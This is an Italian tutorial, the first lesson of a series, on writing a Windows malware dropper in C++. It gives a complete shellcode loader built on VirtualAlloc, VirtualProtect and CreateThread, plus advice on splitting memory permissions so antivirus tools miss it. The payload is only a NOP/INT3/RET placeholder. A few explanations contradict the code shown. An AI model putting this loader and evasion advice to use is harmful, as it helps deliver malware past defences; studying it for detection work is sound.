## Lezione 1: Droppers ##
### Cosa è un Dropper ###
I **droppers** sono dei programmi creati principalmente con l’obiettivo di diffondere un malware, un virus o una backdoor verso un computer bersaglio in modo tale da evitarne, attraverso l’utilizzo di sofisticate tecniche di offuscamento, il rilevamento da parte degli antivirus (e Sandbox). Un dropper sofisticato può essere utilizzato anche per sopravvivere al riavvio della macchina (**persistenza**) o per eseguire una ricognizione approfondita locale e della rete della vittima (***movimento laterale***).

### Dove memorizzare il payload? ###
Ora immergiamoci nello sviluppo del dropper. Il payload, nel caso di un dropper EXE, può essere memorizzato in una delle tre sezioni di un file eseguibile (PE – Portable Executable). La scelta della sezione (sections) da utilizzare varierà drasticamente il codice di implementazione. Diamo uno sguardo alle sezioni disponibili in un file PE:

![image](https://user-images.githubusercontent.com/85390166/180658227-f0e867e9-e381-4ad2-9712-998a9db2d1b1.png)

- .text: E’ necessario inserire il payload in una delle funzioni del codice (es: main / Il nostro caso).
- .data: Il modo più semplice per farlo è inserire il payload in una variabile globale.
- .rsrc: E’ necessario inserire il payload all’interno delle risorse (es: icone, file manifest e immagini).

Ora analizziamo le funzioni WINAPI che il nostro dropper utilizzerà per il rilascio del payload.

### WINAPI ###
Le WINAPI utilizzate nel nostro Dropper sono le seguenti: VirtualAlloc, RtlMoveMemory, VirtualProtect, CreateThread, WaitForSingleObject. Di seguito l’analisi dettagliata delle singole API.
### VirtualAlloc ###
Tale funzione riserverà una regione di pagine (memory buffer) nello spazio degli indirizzi virtuali del processo chiamante per il nostro payload. E’ un modo che ci aiuta a “creare” lo spazio in memoria che conterrà il nostro payload.
Sintassi:
```cpp
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```
### RtlMoveMemory ###
E’ una API che ci permette di copiare un blocco di memoria sorgente in un blocco di memoria di destinazione. Nel nostro caso andremo a copiare  il payload nel nostro nuovo buffer creato.
```cpp
VOID RtlMoveMemory(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
);
```
### VirtualProtect ###
Una funzione fondamentale per il cambio delle protezioni delle regioni di memoria degli indirizzi virtuali. Lo utilizzeremo per rendere eseguibile il nostro nuovo buffer creato.
```cpp
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```
### CreateThread ###
Una funzione semplice da comprendere. Crea un Thread del payload da eseguire nello spazio degli indirizzi virtuali del processo chiamante.
```cpp
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```
### WaitForSingleObject ###
Attende finché l’oggetto specificato non si trova nello stato segnalato o finché non scade l’intervallo di time-out. Verrà utilizzato per verificare che non vi siano errori con il cambio di protezione apportato da VirtualProtect e che quindi il Thread del payload può essere creato.
```cpp
DWORD WaitForSingleObject(
  [in] HANDLE hHandle,
  [in] DWORD  dwMilliseconds
);
```
### Aggiungiamo il nostro payload ##
Per prima cosa abbiamo la necessità di aggiunge al nostro dropper il codice del payload. Per far ciò ci basterà dichiarare un char[] che conterrà l’esadecimale dell’intero codice del nostro payload.
**NB:** In questa sezione, attraverso l’uso di tecniche di offuscamento, è possibile codificare il codice del payload per renderlo FUD (fully undetectable). Affronteremo questo argomento nei prossimi episodi.
Implementiamo la procedura:
```cpp
void * exec_mem;	
DWORD flOldProtect = 0;
unsigned char payload[] = { // Qui andrà posizionato il nostro codice.
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
};
unsigned int dwSize = sizeof(payload) / sizeof(char); // Calcoliamo le dimensioni del nostro payload (verrà utilizzato successivamente per l’allocazione della memoria necessaria a contenere il nostro payload).
### Allocazione del memory buffer ###
Ora bisogna allocare un memory buffer in modo da “trasferire” in memoria il nostro payload da avviare successivamente.
Implementiamo la procedura:
// Allocazione della memoria necessaria a contenere il payload (memory buffer)
exec_mem = VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// Copia del payload nel nuovo buffer
RtlMoveMemory(exec_mem, payload, dwSize);
```
### Avvio del payload ###
Bene, siamo giunti al termine di questo episodio. Ora non ci resta che avviare il payload grazie all’uso di un Thread. 
Implementiamo la procedura:
```cpp
// Make new buffer as executable
BOOL bStatus = VirtualProtect(exec_mem, dwSize, PAGE_EXECUTE_READ, &flOldProtect);
// If all good, run the payload
if ( bStatus != 0 ) {
HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
}
```
**INFO:** Leggendo il sorgente di questa sezione, ci si potrebbe chiedere “perché la protezione di memoria PAGE_EXECUTE_READWRITE è stata impostata nella funzione VirtualProtect e non in VirtualAlloc assieme a MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE?”.
La ragione è semplice: Alcuni analisti (o gli engine degli AV), poiché è abbastanza insolito che il processo abbia necessità di avere una zona di memoria che sia leggibile, scrivibile ed eseguibile allo stesso tempo, potrebbero identificare come malevola tale “firma”. Quindi per aggirare il rilevamento suddividiamo il processo di allocazione di memoria in due fasi distinte: allocamento come leggibile e scrivibile e poi, infine, come eseguibile.
Nei prossimi episodi proveremo a inserire un payload nella sezione rsrc.
